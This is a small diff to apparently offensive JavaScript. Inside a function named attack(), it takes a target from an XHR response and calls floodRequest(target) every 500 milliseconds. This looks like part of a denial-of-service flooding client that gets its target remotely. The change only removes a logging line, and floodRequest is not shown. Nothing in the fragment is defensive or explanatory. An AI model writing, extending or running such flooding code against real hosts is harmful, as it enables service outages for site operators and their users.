@@ -19,7 +19,6 @@ function attack(){
     xhr.addEventListener("readystatechange", function () {
       if (this.readyState === 4) {
         target = this.responseText;
-        console.log(target);
         setInterval(function(){floodRequest(target);}, 500);
       }
     });
